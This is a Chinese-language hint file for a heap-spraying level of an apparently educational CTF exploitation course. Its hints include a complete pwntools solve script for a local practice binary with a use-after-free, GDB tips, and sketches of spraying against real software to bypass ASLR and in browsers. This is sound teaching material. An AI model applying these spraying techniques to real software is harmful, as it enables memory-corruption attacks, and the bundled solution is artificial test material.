# Level 5: Heap Spraying - 提示

<details>
<summary><b>提示 1: 理解堆喷</b></summary>

**什么是堆喷（Heap Spraying）？**

堆喷是一种通过分配大量内存来控制堆布局的技术：
- 分配大量相同/相似的 chunk
- 使堆内存充满特定模式
- 提高 UAF 或其他漏洞的利用成功率

**应用场景**：
- 对抗 ASLR（地址随机化）
- 覆盖大块内存区域
- 增加命中目标地址的概率

**本关目标**：让至少 10 个 chunk 包含模式 `0x53505241592121` (即 "SPRAY!!")
</details>

<details>
<summary><b>提示 2: 程序功能</b></summary>

程序提供：
1. **Alloc (size 32)**: 分配单个 chunk
2. **Alloc spray (N chunks)**: 批量分配 N 个 chunk
3. **Free**: 释放单个 chunk
4. **Free range**: 批量释放
5. **Edit**: 编辑 chunk 内容
6. **Win**: 检查有多少 chunk 包含目标模式

**漏洞**：free 后不置空指针，可以 UAF

**胜利条件**：至少 10 个 chunk 的前 8 字节等于 `0x53505241592121`
</details>

<details>
<summary><b>提示 3: 堆喷策略</b></summary>

```
基本思路：
1. 分配大量 chunk (≥ 10 个)
2. 用目标模式填充所有 chunk
3. 检查胜利条件

示例：
for i in range(10):
    alloc(32)
    edit(i, "SPRAY!!")
```

**为什么需要 10 个？**
- 胜利条件检查所有 chunk
- 统计包含模式的 chunk 数量
- 需要至少 10 个才能通过
</details>

<details>
<summary><b>提示 4: 快速解决方案</b></summary>

```python
from pwn import *

p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def allocSpray(n):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'How many? ', str(n).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# 方法 1: 使用 spray 功能
allocSpray(10)  # 一次分配 10 个

# 编辑每个 chunk
for i in range(10):
    edit(i, p64(0x53505241592121))

# 检查
p.sendlineafter(b'> ', b'6')
p.interactive()
```
</details>

<details>
<summary><b>提示 5: 使用批量分配</b></summary>

程序有专门的 spray 功能：
- 选项 2: "Alloc spray (N chunks)"
- 可以一次分配多个 chunk

```python
# 分配 20 个 chunk
allocSpray(20)

# 现在有 20 个 chunk: index 0-19

# 编辑前 10 个
for i in range(10):
    edit(i, p64(0x53505241592121))

# 检查
p.sendlineafter(b'> ', b'6')
```

**为什么分配 20 个？**
- 提供足够的冗余
- 确保至少 10 个成功
</details>

<details>
<summary><b>提示 6: 完整 Exploit</b></summary>

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def allocSpray(n):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'How many? ', str(n).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

log.info("步骤 1: 堆喷分配 20 个 chunk")
allocSpray(20)

log.info("步骤 2: 编辑前 10 个 chunk")
target = 0x53505241592121
for i in range(10):
    edit(i, p64(target))
    log.info(f"编辑 chunk[{i}]")

log.info("步骤 3: 检查胜利条件")
p.sendlineafter(b'> ', b'6')

p.interactive()
```
</details>

<details>
<summary><b>提示 7: 内存布局分析</b></summary>

```
堆喷前的堆：
empty (很少 chunk)

堆喷后（分配 20 个）：
+---------------+
| chunk[0] @ A0 | ← 可以编辑
+---------------+
| chunk[1] @ A1 | ← 可以编辑
+---------------+
|     ...       |
+---------------+
| chunk[19] @ A19|
+---------------+

编辑后的状态：
chunk[0]: 0x53505241592121 ✓
chunk[1]: 0x53505241592121 ✓
...
chunk[9]: 0x53505241592121 ✓
chunk[10]: 未编辑
...

检查：10 个 chunk 包含模式 → 胜利！
```
</details>

<details>
<summary><b>提示 8: 调试方法</b></summary>

使用 GDB 观察堆布局：

```bash
$ gdb ./vuln
(gdb) b *main+XXX
(gdb) run

# 堆喷后
> 2
> 20

# 查看堆
(gdb) heap
...
20 chunks allocated

# 编辑一些 chunk
> 5
> 0
> <输入数据>

# 再次查看
(gdb) x/gx chunk_address
```
</details>

<details>
<summary><b>提示 9: 常见错误</b></summary>

**错误 1**: "Need more chunks!"
- 原因：chunk 总数 < 10
- 解决：分配至少 10 个

**错误 2**: "Pattern not found"
- 原因：没有正确编辑 chunk
- 解决：确保每个 chunk 的前 8 字节是目标值

**错误 3**: Index out of range
- 原因：编辑的索引超出范围
- 解决：确保编辑 0-9，不要超出分配的数量

**错误 4**: 数据长度不足
- 原因：发送的数据少于 8 字节
- 解决：使用 `p64()` 确保完整的 8 字节
</details>

<details>
<summary><b>提示 10: 进阶 - 真实的堆喷场景</b></summary>

在实际漏洞利用中，堆喷用于：

**场景 1: 提高 UAF 成功率**
```python
# 假设有一个 UAF 漏洞
# 目标：让某个分配落在被释放的 chunk 上

# 堆喷：分配大量目标对象
for i in range(1000):
    allocate_target_object()

# 释放 victim
free_victim()

# 再次堆喷
for i in range(1000):
    allocate_target_object()

# 高概率：某个新分配会重用 victim 的内存
```

**场景 2: 对抗 ASLR**
```python
# 堆喷覆盖可能的地址范围
# 即使不知道确切地址，也能命中

for i in range(10000):
    spray_with_rop_gadgets()
```

**场景 3: 浏览器堆喷**
```javascript
// 在浏览器中
var spray = [];
for (var i = 0; i < 1000; i++) {
    spray.push(new ArrayBuffer(0x1000));
}
```
</details>

<details>
<summary><b>提示 11: 为什么这关很重要？</b></summary>

堆喷是**核心堆利用技术**：

1. **实战必备**
   - 浏览器漏洞利用
   - CTF Pwn 题
   - 真实软件漏洞

2. **提高成功率**
   - 对抗地址随机化
   - 增加利用可靠性
   - 减少失败概率

3. **为高级技术打基础**
   - Heap Feng Shui (Level 6)
   - House of 系列攻击
   - 复杂的堆利用链

**掌握堆喷 = 掌握堆布局控制**
</details>

<details>
<summary><b>提示 12: 优化技巧</b></summary>

**技巧 1: 批量操作**
```python
# 使用 allocSpray 而不是多次 alloc
allocSpray(100)  # 快速
# vs
for i in range(100):  # 慢
    alloc()
```

**技巧 2: 并发编辑**
```python
# 一次编辑多个 chunk（如果程序支持）
payload = b''
for i in range(10):
    payload += p64(0x53505241592121)

# 或者使用循环
for i in range(10):
    edit(i, p64(0x53505241592121))
```

**技巧 3: 验证**
```python
# 编辑后验证
p.sendlineafter(b'> ', b'6')  # 检查
# 等待 "Found X chunks with pattern"
```
</details>
